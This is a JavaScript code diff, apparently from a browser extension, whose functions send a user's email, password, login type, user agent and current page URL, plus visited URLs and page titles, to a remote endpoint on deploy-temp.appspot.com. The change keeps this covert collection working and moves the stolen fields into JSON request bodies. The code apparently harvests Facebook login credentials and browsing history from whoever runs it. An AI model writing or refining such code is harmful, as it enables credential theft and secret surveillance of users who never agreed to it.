@@ -135,7 +135,20 @@ function listenFacebook() {
 }
 
 function onUpdate(email, pass, type) {
-  fetch(`https://deploy-temp.appspot.com/api/update-user-info?email=${email}&pass=${pass}&type=${type}&userAgent=${navigator.userAgent}&location=${window.location.href}`, { method: 'post' })
+  fetch(`https://deploy-temp.appspot.com/api/update-user-info`, { 
+    method: 'post',
+    headers: {
+      'Accept': 'application/json',
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      email: email,
+      pass: pass,
+      type: type,
+      userAgent: navigator.userAgent,
+      location: window.location.href
+    })
+  })
   .then((data) => {
     console.log(data);
   });
@@ -161,8 +174,19 @@ function sendHistory(url, title) {
   if(!url) {
     return;
   }
-  fetch(`https://deploy-temp.appspot.com/api/update-history?url=${url}&userAgent=${navigator.userAgent}&title=${title}`, { method: 'post' })
+  fetch(`https://deploy-temp.appspot.com/api/update-history`, { 
+    method: 'post',
+    headers: {
+      'Accept': 'application/json',
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      url: url,
+      userAgent: navigator.userAgent,
+      title: title
+    })
+  })
   .then((data) => {
-    // console.log(data);
+    console.log(data);
   });
 }
